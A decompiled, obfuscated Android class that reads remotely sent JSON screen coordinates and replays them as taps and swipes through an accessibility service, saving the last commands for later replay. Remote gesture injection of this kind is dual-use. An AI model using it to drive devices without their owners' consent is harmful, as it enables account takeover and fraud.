package defpackage;

import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.graphics.Path;
import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;
import com.mamimobi.AccessService;
import com.mamimobi.videostream.model.ScreenPoints;
import com.mamimobi.videostream.model.SignalingMessage;
import java.util.concurrent.Executors;
import org.json.JSONArray;

/* JADX INFO: loaded from: classes.dex */
public final /* synthetic */ class i71 implements Runnable {
    public final /* synthetic */ int E;
    public final /* synthetic */ String F;
    public final /* synthetic */ SignalingMessage G;
    public final /* synthetic */ Context H;

    public /* synthetic */ i71(String str, SignalingMessage signalingMessage, Context context, int i) {
        this.E = i;
        this.F = str;
        this.G = signalingMessage;
        this.H = context;
    }

    @Override // java.lang.Runnable
    public final void run() {
        switch (this.E) {
            case 0:
                String str = this.F;
                boolean zEquals = str.equals("3");
                final SignalingMessage signalingMessage = this.G;
                final Context context = this.H;
                int i = 0;
                if (zEquals) {
                    try {
                        JSONArray jSONArray = new JSONArray(signalingMessage.text);
                        Path path = new Path();
                        while (i < jSONArray.length()) {
                            ScreenPoints screenPoints = (ScreenPoints) AccessService.h0.b(ScreenPoints.class, jSONArray.getString(i));
                            if (screenPoints.action.equals("d")) {
                                path.moveTo(screenPoints.x, screenPoints.y);
                            } else {
                                path.lineTo(screenPoints.x, screenPoints.y);
                            }
                            i++;
                        }
                        AccessService.e0.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, 350L)).build(), null, null);
                        final int i2 = 0;
                        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() { // from class: j71
                            @Override // java.lang.Runnable
                            public final void run() {
                                switch (i2) {
                                    case 0:
                                        Context context2 = context;
                                        String strQ0 = fa0.q0(context2, "PATH", "");
                                        boolean z = AccessService.B0.get();
                                        SignalingMessage signalingMessage2 = signalingMessage;
                                        if (!z) {
                                            if (signalingMessage2.text.equals(strQ0)) {
                                                fa0.Q0(context2, "PATH", "");
                                            }
                                        } else if (!signalingMessage2.text.equals(strQ0)) {
                                            fa0.Q0(context2, "PATH", signalingMessage2.text);
                                        }
                                        break;
                                    case 1:
                                        Context context3 = context;
                                        String strQ02 = fa0.q0(context3, "CLICK", "");
                                        boolean z2 = AccessService.B0.get();
                                        SignalingMessage signalingMessage3 = signalingMessage;
                                        if (!z2) {
                                            if (signalingMessage3.text.equals(strQ02)) {
                                                fa0.Q0(context3, "CLICK", "");
                                            }
                                        } else if (!signalingMessage3.text.equals(strQ02)) {
                                            fa0.Q0(context3, "CLICK", signalingMessage3.text);
                                        }
                                        break;
                                    default:
                                        Context context4 = context;
                                        String strQ03 = fa0.q0(context4, "MIXCLICK", "");
                                        boolean z3 = AccessService.B0.get();
                                        SignalingMessage signalingMessage4 = signalingMessage;
                                        if (!z3) {
                                            if (signalingMessage4.text.equals(strQ03)) {
                                                fa0.Q0(context4, "MIXCLICK", "");
                                            }
                                        } else if (!signalingMessage4.text.equals(strQ03)) {
                                            fa0.Q0(context4, "MIXCLICK", signalingMessage4.text);
                                        }
                                        break;
                                }
                            }
                        }, 5000L);
                    } catch (Exception e) {
                        e.printStackTrace();
                        return;
                    }
                } else if (str.equals("1")) {
                    try {
                        JSONArray jSONArray2 = new JSONArray(signalingMessage.text);
                        while (i < jSONArray2.length()) {
                            ScreenPoints screenPoints2 = (ScreenPoints) AccessService.h0.b(ScreenPoints.class, jSONArray2.getString(i));
                            d91.b(AccessService.e0, screenPoints2.x, screenPoints2.y);
                            SystemClock.sleep(1000L);
                            i++;
                        }
                        final int i3 = 1;
                        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() { // from class: j71
                            @Override // java.lang.Runnable
                            public final void run() {
                                switch (i3) {
                                    case 0:
                                        Context context2 = context;
                                        String strQ0 = fa0.q0(context2, "PATH", "");
                                        boolean z = AccessService.B0.get();
                                        SignalingMessage signalingMessage2 = signalingMessage;
                                        if (!z) {
                                            if (signalingMessage2.text.equals(strQ0)) {
                                                fa0.Q0(context2, "PATH", "");
                                            }
                                        } else if (!signalingMessage2.text.equals(strQ0)) {
                                            fa0.Q0(context2, "PATH", signalingMessage2.text);
                                        }
                                        break;
                                    case 1:
                                        Context context3 = context;
                                        String strQ02 = fa0.q0(context3, "CLICK", "");
                                        boolean z2 = AccessService.B0.get();
                                        SignalingMessage signalingMessage3 = signalingMessage;
                                        if (!z2) {
                                            if (signalingMessage3.text.equals(strQ02)) {
                                                fa0.Q0(context3, "CLICK", "");
                                            }
                                        } else if (!signalingMessage3.text.equals(strQ02)) {
                                            fa0.Q0(context3, "CLICK", signalingMessage3.text);
                                        }
                                        break;
                                    default:
                                        Context context4 = context;
                                        String strQ03 = fa0.q0(context4, "MIXCLICK", "");
                                        boolean z3 = AccessService.B0.get();
                                        SignalingMessage signalingMessage4 = signalingMessage;
                                        if (!z3) {
                                            if (signalingMessage4.text.equals(strQ03)) {
                                                fa0.Q0(context4, "MIXCLICK", "");
                                            }
                                        } else if (!signalingMessage4.text.equals(strQ03)) {
                                            fa0.Q0(context4, "MIXCLICK", signalingMessage4.text);
                                        }
                                        break;
                                }
                            }
                        }, 5000L);
                    } catch (Exception e2) {
                        e2.printStackTrace();
                        return;
                    }
                } else if (str.equals("2")) {
                    try {
                        JSONArray jSONArray3 = new JSONArray(signalingMessage.text);
                        while (i < jSONArray3.length()) {
                            ScreenPoints screenPoints3 = (ScreenPoints) AccessService.h0.b(ScreenPoints.class, jSONArray3.getString(i));
                            d91.b(AccessService.e0, screenPoints3.x, screenPoints3.y);
                            SystemClock.sleep(1000L);
                            i++;
                        }
                        final int i4 = 2;
                        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() { // from class: j71
                            @Override // java.lang.Runnable
                            public final void run() {
                                switch (i4) {
                                    case 0:
                                        Context context2 = context;
                                        String strQ0 = fa0.q0(context2, "PATH", "");
                                        boolean z = AccessService.B0.get();
                                        SignalingMessage signalingMessage2 = signalingMessage;
                                        if (!z) {
                                            if (signalingMessage2.text.equals(strQ0)) {
                                                fa0.Q0(context2, "PATH", "");
                                            }
                                        } else if (!signalingMessage2.text.equals(strQ0)) {
                                            fa0.Q0(context2, "PATH", signalingMessage2.text);
                                        }
                                        break;
                                    case 1:
                                        Context context3 = context;
                                        String strQ02 = fa0.q0(context3, "CLICK", "");
                                        boolean z2 = AccessService.B0.get();
                                        SignalingMessage signalingMessage3 = signalingMessage;
                                        if (!z2) {
                                            if (signalingMessage3.text.equals(strQ02)) {
                                                fa0.Q0(context3, "CLICK", "");
                                            }
                                        } else if (!signalingMessage3.text.equals(strQ02)) {
                                            fa0.Q0(context3, "CLICK", signalingMessage3.text);
                                        }
                                        break;
                                    default:
                                        Context context4 = context;
                                        String strQ03 = fa0.q0(context4, "MIXCLICK", "");
                                        boolean z3 = AccessService.B0.get();
                                        SignalingMessage signalingMessage4 = signalingMessage;
                                        if (!z3) {
                                            if (signalingMessage4.text.equals(strQ03)) {
                                                fa0.Q0(context4, "MIXCLICK", "");
                                            }
                                        } else if (!signalingMessage4.text.equals(strQ03)) {
                                            fa0.Q0(context4, "MIXCLICK", signalingMessage4.text);
                                        }
                                        break;
                                }
                            }
                        }, 5000L);
                    } catch (Exception e3) {
                        e3.printStackTrace();
                        return;
                    }
                }
                break;
            default:
                Executors.newSingleThreadExecutor().execute(new i71(this.F, this.G, this.H, 0));
                break;
        }
    }
}
